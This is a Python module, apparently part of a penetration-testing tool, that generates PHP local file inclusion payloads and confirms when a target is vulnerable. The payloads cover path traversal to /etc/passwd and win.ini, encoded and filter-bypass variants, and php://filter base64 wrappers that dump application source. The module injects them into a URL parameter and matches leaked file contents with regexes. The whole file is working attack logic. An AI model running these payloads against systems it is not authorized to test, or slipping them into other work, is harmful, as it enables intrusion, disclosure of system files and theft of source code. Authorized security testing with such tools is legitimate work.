"""
Pure parsing, payload generation, and response signature detection for php_lfi.
No I/O or network requests here.
"""
from __future__ import annotations

import base64
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

_PASSWD_REGEX = re.compile(r"root:[x*]?:0:0:[^:\n]*:[^:\n]*:[^\n]*", re.IGNORECASE)
_WIN_INI_REGEX = re.compile(r"\[(fonts|extensions|mci extensions|files)\]|for 16-bit app support", re.IGNORECASE)
_BASE64_PHP_REGEX = re.compile(r"(?:PD9waH|PD9QSF|PD8)[A-Za-z0-9+/=]{10,}")


@dataclass
class RawLfiProbe:
    payload: str
    file_description: str
    status_code: int = 0
    url: str = ""
    body: str = ""
    error: Optional[str] = None


@dataclass
class RawLfiResult:
    target: str = ""
    parameter: str = ""
    probes: List[RawLfiProbe] = field(default_factory=list)
    tested_count: int = 0
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    """Normalize target to full URL defaulting to http://."""
    target = target.strip()
    if not target:
        return ""
    if target.startswith("http://") or target.startswith("https://"):
        return target
    return f"http://{target}"


def parse_host_port(target: str) -> Tuple[str, int]:
    """Extract host and port from target URL or host string."""
    parsed = urllib.parse.urlsplit(target if "://" in target else f"//{target}")
    host = parsed.hostname or target
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port


def build_lfi_payloads(target_file: str = "") -> List[Tuple[str, str]]:
    """Generates standard LFI path traversal and PHP filter wrapper payloads.
    Returns list of (payload_string, file_description)."""
    payloads: List[Tuple[str, str]] = [
        ("../../../../../../../../etc/passwd", "/etc/passwd"),
        ("/etc/passwd", "/etc/passwd"),
        ("....//....//....//....//etc/passwd", "/etc/passwd"),
        ("..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd"),
        ("php://filter/convert.base64-encode/resource=index.php", "php://filter"),
        ("php://filter/read=convert.base64-encode/resource=index", "php://filter"),
        ("../../../../../../../../windows/win.ini", "win.ini"),
        ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "win.ini"),
    ]

    clean_target = target_file.strip().lstrip("/")
    if clean_target:
        payloads.insert(0, (f"../../../../../../../../{clean_target}", clean_target))
        payloads.insert(1, (f"php://filter/convert.base64-encode/resource={clean_target}", f"php://filter/{clean_target}"))

    return payloads


def build_probe_url(target: str, parameter: str, payload: str) -> str:
    """Constructs target URL with the tested parameter set to the specified payload."""
    url = normalize_target_url(target)
    parsed = urllib.parse.urlsplit(url)
    existing_params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

    param_found = False
    new_params = []
    for k, v in existing_params:
        if k == parameter:
            new_params.append((k, payload))
            param_found = True
        else:
            new_params.append((k, v))
    if not param_found:
        new_params.append((parameter, payload))

    query_str = urllib.parse.urlencode(new_params, safe=":/%=\\")
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, query_str, parsed.fragment))


def check_lfi_response(content: str) -> Tuple[bool, str, str]:
    """Inspects response content for signatures of sensitive files.
    Returns (confirmed, file_type, snippet)."""
    if not content:
        return False, "", ""

    match_passwd = _PASSWD_REGEX.search(content)
    if match_passwd:
        start = max(0, match_passwd.start() - 20)
        end = min(len(content), match_passwd.end() + 100)
        return True, "/etc/passwd", content[start:end].strip()

    match_win = _WIN_INI_REGEX.search(content)
    if match_win:
        start = max(0, match_win.start() - 20)
        end = min(len(content), match_win.end() + 100)
        return True, "win.ini", content[start:end].strip()

    # 3. PHP filter base64 match
    match_b64 = _BASE64_PHP_REGEX.search(content)
    if match_b64:
        encoded_str = match_b64.group(0).strip()
        try:
            decoded = base64.b64decode(encoded_str, validate=False).decode("utf-8", errors="ignore")
            if "<?php" in decoded or "<?" in decoded:
                snippet = decoded[:200].strip()
                return True, "php://filter source", snippet
        except Exception:
            pass

    return False, "", ""


def parse_lfi_result(raw: RawLfiResult) -> Dict[str, Any]:
    """Transforms raw probe results into structured finding output."""
    if raw.error:
        return {
            "target": raw.target,
            "parameter": raw.parameter,
            "vulnerable": False,
            "file_disclosed": None,
            "payload_used": None,
            "snippet": None,
            "tested_payloads_count": raw.tested_count,
            "error": raw.error,
        }

    for probe in raw.probes:
        if probe.body:
            is_lfi, file_desc, snippet = check_lfi_response(probe.body)
            if is_lfi:
                return {
                    "target": raw.target,
                    "parameter": raw.parameter,
                    "vulnerable": True,
                    "file_disclosed": file_desc,
                    "payload_used": probe.payload,
                    "snippet": snippet,
                    "tested_payloads_count": raw.tested_count,
                    "error": None,
                }

    errors = [p.error for p in raw.probes if p.error]
    error_msg = errors[0] if (errors and len(errors) == len(raw.probes)) else None

    return {
        "target": raw.target,
        "parameter": raw.parameter,
        "vulnerable": False,
        "file_disclosed": None,
        "payload_used": None,
        "snippet": None,
        "tested_payloads_count": raw.tested_count,
        "error": error_msg,
    }
